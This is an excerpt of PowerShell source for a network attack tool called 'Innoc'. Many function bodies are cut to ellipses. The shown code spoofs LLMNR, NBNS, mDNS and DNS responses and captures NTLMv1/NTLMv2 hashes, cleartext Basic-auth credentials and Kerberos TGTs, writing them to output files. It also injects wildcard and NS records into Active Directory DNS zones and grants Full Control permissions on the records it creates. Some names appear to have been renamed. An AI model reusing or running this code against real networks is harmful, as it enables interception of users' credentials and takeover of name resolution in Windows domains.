                            $Innoc.NTLMv2_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
                        }

                        if($Innoc.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$Innoc.spoofer_repeat -and $SourceIP -ne $IP)
                        {
                            $Innoc.IP_capture_list.Add($SourceIP) > $null
                        }

                    }
                    else
                    {
                        $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
                    }

                }
                else
                {
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
                }
            ...
            elseif($NTLM_length -eq 24)
            {
                ...
                if($Capture -eq 'Y')
                {
                    ...
                    if($Innoc.machine_accounts -or (!$Innoc.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
                    {
                        $Innoc.NTLMv1_list.Add($NTLMv1_hash) > $null

                        if(!$Innoc.console_unique -or ($Innoc.console_unique -and $Innoc.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
                            $Innoc.output_queue.Add($NTLMv1_hash) > $null
                        }
                        else
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
                        }

                        if($Innoc.file_output -and (!$Innoc.file_unique -or ($Innoc.file_unique -and $Innoc.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
                        {
                            $Innoc.NTLMv1_file_queue.Add($NTLMv1_hash) > $null
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 written to " + "Innoc-NTLMv1.txt") > $null
                        }

                        if($Innoc.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
                        {
                            $Innoc.NTLMv1_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
                        }
                    ...
                    {
                        $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
                    }

                }
                else
                {
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
                }

            }
            elseif($NTLM_length -eq 0)
            {
                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLM null response from $SourceIP($NTLM_host_string)`:$SourcePort") > $null
            }
...
# THIS Functions ScriptBlock
$THIS_functions_scriptblock =
{

    function Disable-THISNode
    {
        ...
        try
        {
            ...
            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] THIS node $Node tombstoned in $Zone") > $null
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }
    ...
    function Enable-THISNode
    {
        ...
        try
        {
            ...
            $directory_entry.SetInfo()
            $success = $true
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] THIS node $Node added to $Zone") > $null;
            $Innoc.THIS_table.$Node = "1"
        }
        catch
        {
            $success = $false
    ...
    function Get-THISNodeTombstoned
    {
    ...
    function Grant-THISPermission
    {
        ...
        try
        {
            ...
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Full Control ACE added for $Principal to $Node DACL") > $null
        }
        catch
        {
            $error_message = $_.Exception.Message
    ...
    function New-THISNode
    {
        ...
        try
        {
            ...
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] THIS node $Node type $Type added to $Zone") > $null
            $output = $true
            $Innoc.THIS_table.$Node = "1"
        }
        catch
    ...
    function New-SOASerialNumberArray
    {
        ...
        try
        {
            ...
            {
                $Innoc.output_queue.Add("[-] $Zone SOA record not found") > $null
            }
            else
            {
        ...
        {
            $Innoc.output_queue.Add("[-] $DomainController did not respond on TCP port 53") > $null
        }
    ...
    function Invoke-THISSpoofer
    {
        ...
        try
        {
            $node_added = New-THISNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $Node -Partition $Partition -Type $Type -TTL $TTL -Zone $Zone

            if($Innoc.THIS -and !$node_added)
            {
                $node_tombstoned = Get-THISNodeTombstoned -Credential $Credential -Domain $Domain -DomainController $DomainController -Node $Node -Partition $Partition -Zone $Zone

                if($node_tombstoned)
                {
                    Enable-THISNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Node $Node -Partition $Partition -Type $Type -TTL $TTL -Zone $Zone
                }
        ...
        catch
        {
            ...
            $error_message = $error_message -replace "`n",""
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] THIS spoofer disabled due to error") > $null
            $Innoc.THIS = $null
        }

    }

    function Invoke-THISCheck
    {
        [CmdletBinding()]
        param
        (
        ...
        foreach($request in $RequestTable.Keys)
        {
            ...
            if(($RequestTable.$request | Sort-Object -Unique).Count -gt $Threshold)
            {
                ...
                if(!$Innoc.THIS_table.ContainsKey($request))
                {
                    $Innoc.THIS_table.Add($request,"")
                }
                
                if($Ignore -NotContains $request -and !$Innoc.THIS_table.$request)
                {    
                    Invoke-THISSpoofer -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $request -Partition $Partition -Type 'A' -TTL $TTL -Zone $Zone
                }
                elseif($Ignore -Contains $request)
                {

                    if(!$Innoc.THIS_table.$request)
                    {
                        $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] THIS combo attack ignored $request") > $null
                        $Innoc.THIS_table.$request = 3
                    }
    ...
    function New-KerberosKirbi
    {
            ...
            if($ASN1_index -ge 0)
            {
                ...
                if($ASN1_index -ge 0)
                {
                    ...
                    if($ASN1_index -ge 0)
                    {
                        ...
                        {
                            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $service($service_port) Kerberos TGT captured for $username@$realm from $session") > $null   
                            $Innoc.kerberos_TGT_list.Add($kirbi) > $null
                            $Innoc.kerberos_TGT_username_list.Add("$source_IP $username $realm $($Innoc.kerberos_TGT_list.Count - 1)") > $null
                            $kirbi_count = ($Innoc.kerberos_TGT_username_list -like "* $username $realm *").Count
                        }
                        ...
                        if($kirbi_count -le $KerberosCount)
                        {
                            ...
                            try
                            {
                                ...
                                $krb_file.close()
                                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $service($service_port) Kerberos TGT for $username@$realm written to $krb_path") > $null
                            }
                            catch
                            {
                                $error_message = $_.Exception.Message
                    ...
                    {
                        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos TGT not found from $session") > $null    
                    }

                }
                else
                {
                    $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos autenticator not found from $sessiont") > $null    
                }

            }
            else
            {
                $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos failed to decrypt capture from $session") > $null    
            }
        ...
        else
        {
            ...
            if($apreq_converted -like "*A0030201??A1030201*")
            {
                ...
                $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos unsupported encryption type $encryption_type from $session") > $null
            }
            else
            {
                $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos failed to extract AS-REQ from $session") > $null 
            }
...
$SMB_functions_scriptblock =
{
    ...
    function Get-SMBConnection
    {
        ...
        if(!$Innoc.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq "72" -and $SourceIP -ne $SnifferIP)
        {
            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SMBPort) negotiation request detected from $session") > $null
        }
        elseif(!$Innoc.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq "72" -and $SourceIP -eq $SnifferIP)
        {
            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing negotiation request detected to $session_outgoing") > $null
        }

        if(!$Innoc.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)
        {
            $Innoc.SMB_session_table.Add($Session,"")
        }

        $SMB_index = $payload_converted.IndexOf("FE534D42")

        if(!$Innoc.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq "0000" -and $SourceIP -ne $SnifferIP)
        {
            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SMBPort) negotiation request detected from $session") > $null
        }
        elseif(!$Innoc.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq "0000" -and $SourceIP -eq $SnifferIP)
        {
            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing negotiation request detected to $session_outgoing") > $null
        }
        ...
        {
            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SMBPort) authentication method is Kerberos for $session") > $null
        ...
        {
            $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing authentication method is Kerberos to $session_outgoing") > $null
    ...
    function Get-SMBNTLMChallenge
    {
        ...
        if($NTLM_index -gt 0)
        {
            ...
            if($target_info_flag -eq 1)
            {
                ...
                if($netBIOS_domain_name -and $DNS_domain_name -and !$Innoc.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)
                {
                    $Innoc.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name") > $null
                }

                for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                {

                    if($Innoc.enumerate[$i].IP -eq $target -and !$Innoc.enumerate[$i].Hostname)
                    {
                        $Innoc.enumerate[$i].Hostname = $DNS_computer_name
                        $Innoc.enumerate[$i]."DNS Domain" = $DNS_domain_name
                        $Innoc.enumerate[$i]."netBIOS Domain" = $netBIOS_domain_name
                        break
                    }
...
$HTTP_scriptblock =
{
    ...
    function Get-NTLMChallengeBase64
    {
        ...
        if(!$Innoc.HTTP_session_table.ContainsKey("$ClientIPAddress`:$ClientPort"))
        {
            $Innoc.HTTP_session_table.Add("$ClientIPAddress`:$ClientPort",$HTTP_challenge)
        }
        else
        {
            $Innoc.HTTP_session_table["$ClientIPAddress`:$ClientPort"] = $HTTP_challenge
        }
        
        $hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($Innoc.computer_name)
        $netBIOS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Innoc.netBIOS_domain)
        $DNS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Innoc.DNS_domain)
        $DNS_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($Innoc.DNS_computer_name)
    ...
    {
        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $HTTP_running = $false
    ...
    :HTTP_listener_loop while($Innoc.running -and $HTTP_running)
    {
        $TCP_request = $null
        ...
        if(!$HTTP_client.Connected -and $Innoc.running)
        {
            ...
            if($HTTPS_listener)
            {
                ...
                $SSL_cert = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $Innoc.certificate_CN})
        ...
        if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*" -or $TCP_request -like "50-4f-53-54*")
        {
            ...
            if($NBNSBruteForcePause)
            {
                $Innoc.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
                $Innoc.hostname_spoof = $true
            }
            ...
            {
                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $HTTP_method request for $HTTP_request_raw_URL received from $HTTP_source_IP`:$HTTP_source_port") > $null
                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP`:$HTTP_source_port") > $null

                if($HTTP_header_user_agent)
                {
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:$HTTP_source_port`:`n$HTTP_header_user_agent") > $null
                }

                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                {
                    $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent match from $HTTP_source_IP`:$HTTP_source_port") > $null
                }
            ...
            if($TCP_request -like "50-4f-53-54*")
            {
                ...
                {
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) POST request $HTTP_POST_request captured from $HTTP_source_IP`:$HTTP_source_port") > $null
                    $Innoc.POST_request_file_queue.Add($HTTP_POST_request) > $null
                    $Innoc.POST_request_list.Add($HTTP_POST_request) > $null
                }
            ...
            elseif($HTTP_header_authorization.StartsWith('Negotiate '))
            {
                ...
                if($HTTP_index -gt 0)
                {
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) authentication method is Kerberos for $HTTP_source_IP`:$HTTP_source_port") > $null
            ...
            elseif($HTTP_header_authorization.Startswith('Basic '))
            {
                ...
                $HTTP_client_close = $true
                $Innoc.cleartext_file_queue.Add($cleartext_credentials) > $null
                $Innoc.cleartext_list.Add($cleartext_credentials) > $null
                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic authentication cleartext credentials captured from $HTTP_source_IP`:$HTTP_source_port`:") > $null
                $Innoc.output_queue.Add($cleartext_credentials) > $null

                if($Innoc.file_output)
                {
                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic authentication cleartext credentials written to " + "Innoc-Cleartext.txt") > $null
                }
...
$sniffer_scriptblock = 
{
    ...
    {
        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Error starting sniffer/spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
    ...
    if($Pcap -eq 'File')
    {
        $pcap_path = $output_directory + "\Innoc-Packets.pcap"
        ...
        catch
        {
            ...
            $error_message = $error_message -replace "`n",""
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Disabling pcap output") > $null
            $Pcap = ''
        }

    }
    elseif($Pcap -eq 'Memory' -and !$Innoc.pcap)
    {
        $Innoc.pcap = New-Object System.Collections.ArrayList
        $Innoc.pcap.AddRange($pcap_header)
    }

    while($Innoc.running -and $sniffer_running)
    {
        ...
        switch($protocol_number)
        {
            ...
            {  # TCP
                ...
                if($TCP_flags.SubString(6,1) -eq "1" -and $TCP_flags.SubString(3,1) -eq "0" -and $destination_IP -eq $IP)
                {
                    ...
                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] TCP($destination_port) SYN packet detected from $TCP_Session") > $null
                }
                ...
                switch ($destination_port)
                {
                    ...
                    139 
                    {
                        ...
                        if($Innoc.SMB_session_table.ContainsKey("$source_IP`:$source_port"))
                        {
                ...
                switch ($source_port)
                {
                    ...
                    139 
                    {
                        ...
                        if($NTLM_challenge -and $destination_IP -ne $source_IP)
                        {
                            ...
                            if($source_IP -eq $IP)
                            {
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port") > $null
                            }
                            else
                            {
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $NTLM_challenge received from $destination_IP`:$destination_port") > $null
                            }

                            $Innoc.SMB_session_table."$destination_IP`:$destination_port" = $NTLM_challenge
                            $NTLM_challenge = $null
                        }
                    ...
                    445
                    {
                        ...
                        if($NTLM_challenge -and $destination_IP -ne $source_IP)
                        {
                            ...
                            if($source_IP -eq $IP)
                            {
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port") > $null
                            }
                            else
                            {
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge received from $destination_IP`:$destination_port") > $null
                            }
                    ...
                    if($payload_bytes)
                    {
                        ...
                        if($pcap_packet.Count -eq ($packet_length + 30))
                        {
                            ...
                            switch ($Pcap)
                            {
                                ...
                                'Memory'
                                {
                                    $Innoc.pcap.AddRange($pcap_packet) 
                                }
            ...
            {  # UDP
                ...
                switch($destination_port)
                {
                    ...
                    53 # DNS
                    {
                        ...
                        {
                            $Innoc.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message") > $null
                        }
                        else
                        {
                            $Innoc.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string sent to $destination_IP [outgoing query]") > $null
                        }
                        ...
                        if(([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($payload_bytes[10..11]) -ne '00-01')
                        {
                            ...
                            if([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00')
                            {
                                ...
                                if($NBNS_query_string -notmatch '[^\x00-\x7F]+')
                                {
                                    ...
                                    if(!$Innoc.request_table.ContainsKey($NBNS_query_string))
                                    {
                                        $Innoc.request_table.Add($NBNS_query_string.ToLower(),[Array]$source_IP.IPAddressToString)
                                        $Innoc.request_table_updated = $true
                                    }
                                    else
                                    {
                                        $Innoc.request_table.$NBNS_query_string += $source_IP.IPAddressToString
                                        $Innoc.request_table_updated = $true
                                    }
                            ...
                            if($SpooferLearning -eq 'Y' -and $Innoc.valid_host_list -notcontains $NBNS_query_string -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -and $source_IP -ne $IP)
                            {
                                ...
                                if($NBNS_learning_send)
                                {
                                    ...
                                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString) > $null
                                }
                            ...
                            {
                                $Innoc.output_queue.Add("$NBNS_response_type [$(Get-Date -format s)] NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message") > $null
                            }
                            elseif($SpooferLearning -eq 'Y' -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01' -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                            {
                                ...
                                if($Innoc.valid_host_list -notcontains $NBNS_query_string)
                                {
                                    $Innoc.valid_host_list.Add($NBNS_query_string) > $null
                                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP [added to valid host list]") > $null
                                }
                    ...
                    {   
                        ...
                        if(([System.BitConverter]::ToString($payload_bytes)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($payload_bytes[4..11]) -eq "00-01-00-00-00-00-00-00")
                        {
                            ...
                            $Innoc.output_queue.Add("$mDNS_response_type [$(Get-Date -format s)] mDNS(QU) request $mDNS_query_string_full received from $source_IP $mDNS_response_message") > $null
                        }
                            ...
                            $payload_bytes[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($payload_bytes[4..11]) -eq "00-02-00-00-00-00-00-00"))
                        {
                            ...
                            $Innoc.output_queue.Add("$mDNS_response_type [$(Get-Date -format s)] mDNS(QM) request $mDNS_query_string_full received from $source_IP $mDNS_response_message") > $null
                        }
                    ...
                    5355 # LLMNR
                    {
                        ...
                        if([System.BitConverter]::ToString($payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length - 3)]) -ne '00-1c') # ignore AAAA for now
                        {
                            ...
                            if(!$Innoc.request_table.ContainsKey($LLMNR_query_string))
                            {
                                $Innoc.request_table.Add($LLMNR_query_string.ToLower(),[Array]$source_IP.IPAddressToString)
                                $Innoc.request_table_updated = $true
                            }
                            else
                            {
                                $Innoc.request_table.$LLMNR_query_string += $source_IP.IPAddressToString
                                $Innoc.request_table_updated = $true
                            }

                            $LLMNR_request_ignore = $false
                
                            if($SpooferLearning -eq 'Y' -and $Innoc.valid_host_list -notcontains $LLMNR_query_string -and $source_IP -ne $IP)
                            {
                                ...
                                if($LLMNR_learning_send)
                                {
                                    ...
                                    $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request $LLMNR_query_string sent to 224.0.0.252") > $null
                                }
                            ...
                            {
                                $Innoc.output_queue.Add("$LLMNR_response_type [$(Get-Date -format s)] LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message") > $null
                            }
                ...
                switch($endpoint_source_port)
                {
                    ...
                    5355 # LLMNR Response
                    {
                        ...
                        if($SpooferLearning -eq 'Y' -and $LLMNR_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                        {
                            ...
                            if($Innoc.valid_host_list -notcontains $LLMNR_query_string)
                            {
                                $Innoc.valid_host_list.Add($LLMNR_query_string) > $null
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $LLMNR_query_string LLMNR response $LLMNR_response_IP received from $source_IP [added to valid host list]") > $null
                            }
...
$DNS_spoofer_scriptblock = 
{
    ...
    {
        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Error starting DNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $DNS_running = $false
    ...
    while($Innoc.running -and $DNS_running)
    {   
...
$LLMNR_spoofer_scriptblock = 
{
    ...
    {
        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Error starting LLMNR spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $LLMNR_running = $false
    ...
    while($Innoc.running -and $LLMNR_running)
    {   
    ...
    $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] leaving") > $null
    $LLMNR_UDP_client.Close()
 }
...
$mDNS_spoofer_scriptblock = 
{
    ...
    {
        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Error starting mDNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $mDNS_running = $false
    ...
    while($Innoc.running -and $mDNS_running)
    {   
...
$NBNS_spoofer_scriptblock = 
{
    ...
    {
        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] Error starting NBNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $NBNS_running = $false
    ...
    while($Innoc.running -and $NBNS_running)
    {
        ...
        if($NBNS_request_data -and [System.BitConverter]::ToString($NBNS_request_data[10..11]) -ne '00-01')
        {
            ...
            {
                $Innoc.output_queue.Add("$NBNS_response_type [$(Get-Date -format s)] NBNS request $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message") > $null    
            }
...
$NBNS_bruteforce_spoofer_scriptblock = 
{
    ...
    $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget") > $null
    $NBNS_paused = $false          
    ...
    while($Innoc.running)
    {
        ...
        :NBNS_spoofer_loop while (!$Innoc.hostname_spoof -and $Innoc.running)
        {

            if($NBNS_paused)
            {
                $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer") > $null
                $NBNS_paused = $false
            }
            ...
            for ($i = 0; $i -lt 255; $i++)
            {
                ...
                for ($j = 0; $j -lt 255; $j++)
                {
                    ...
                    if($Innoc.hostname_spoof -and $NBNSBruteForcePause)
                    {
                        $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer") > $null
                        $NBNS_paused = $true
...
$control_scriptblock =
{
    param ($THISACE,$THISCleanup,[System.Management.Automation.PSCredential]$THISCredential,$THISDomain,
        $THISDomainController,$THISForest,$THISHostsIgnore,$THISNS,$THISNSTarget,$THISPartition,
        $THISThreshold,$THISTTL,$THISZone,$ConsoleQueueLimit,$elevated_privilege,$NBNSBruteForcePause,
    ...
    function Invoke-OutputQueueLoop
    {
        ...
        while($Innoc.output_queue.Count -gt 0)
        {
            $Innoc.console_queue.Add($Innoc.output_queue[0]) > $null

            if($Innoc.file_output)
            {
                
                if ($Innoc.output_queue[0].StartsWith("[+] ") -or $Innoc.output_queue[0].StartsWith("[*] ") -or $Innoc.output_queue[0].StartsWith("[!] ") -or $Innoc.output_queue[0].StartsWith("[-] "))
                {
                    $Innoc.log_file_queue.Add($Innoc.output_queue[0]) > $null
                }
                else
    ...
    function Stop-InnocRunspace
    {
        param ([String]$Message)
        
        if($Innoc.HTTPS -and !$Innoc.HTTPS_existing_certificate -or ($Innoc.HTTPS_existing_certificate -and $Innoc.HTTPS_force_certificate_delete))
        {
            ...
            try
            {
                ...
                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $Innoc.certificate_issuer})
            ...
            {
                $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
            }

        }

        if($THISCleanup -eq 'Y' -and $Innoc.THIS_table.Count -gt 0)
        {
            [Array]$THIS_table_keys_temp = $Innoc.THIS_table.Keys

            foreach($THIS_host in $THIS_table_keys_temp)
            {
                
                if($Innoc.THIS_table.$THIS_host -ge 1)
                {

                    try
                    {
                        Disable-THISNode -Credential $THISCredential -Domain $THISDomain -DomainController $THISDomainController -Node $THIS_host -Partition $THISPartition -Zone $THISZone
                        $Innoc.THIS_table.$THIS_host = $null
                    }
                    catch
                    {
                        $error_message = $_.Exception.Message
                        $error_message = $error_message -replace "`n",""
                        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] THIS host record for $THIS_host remove failed") > $null
                    }
        ...
        if($Innoc.relay_running)
        {
            ...
            if($Message)
            {
                $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Innoc Relay is exiting due to $Message") > $null
            }
            else
            {
                $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Innoc Relay is exiting") > $null  
            }
        ...
        if($Innoc.running)
        {
            ...
            if($Message)
            {
                $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Innoc is exiting due to $Message") > $null
            }
            else
            {
                $Innoc.output_queue.Add("[*] [$(Get-Date -format s)] Innoc is exiting") > $null  
            }
    ...
    if($Innoc.THIS -contains 'Wildcard')
    {
        Invoke-THISSpoofer -Credential $THISCredential -Data $SpooferIP -Domain $THISDomain -DomainController $THISDomainController -Forest $THISForest -Node '*' -Partition $THISPartition -Type 'A'-TTL $THISTTL -Zone $THISZone
    }

    if($Innoc.THIS -contains 'NS')
    {

        if($THISNSTarget.EndsWith($THISZone))
        {
            $NS_data = $THISNSTarget
            $THISNSTarget = $THISNSTarget -replace ".$THISZone",''
        }
        else
        {
            $NS_data = $THISNSTarget + "." + $THISZone
        }

        Invoke-THISSpoofer -Credential $THISCredential -Data $SpooferIP -Domain $THISDomain -DomainController $THISDomainController -Forest $THISForest -Node $THISNSTarget -Partition $THISPartition -Type 'A' -TTL $THISTTL -Zone $THISZone
        Invoke-THISSpoofer -Credential $THISCredential -Data $NS_data -Domain $THISDomain -DomainController $THISDomainController -Forest $THISForest -Node $THISNS -Partition $THISPartition -Type 'NS' -TTL $THISTTL -Zone $THISZone
    }
    ...
    $run_count_NTLMv1 = $RunCount + $Innoc.NTLMv1_list.Count
    $run_count_NTLMv2 = $RunCount + $Innoc.NTLMv2_list.Count
    $run_count_cleartext = $RunCount + $Innoc.cleartext_list.Count
    ...
    while($Innoc.running)
    {
        ...
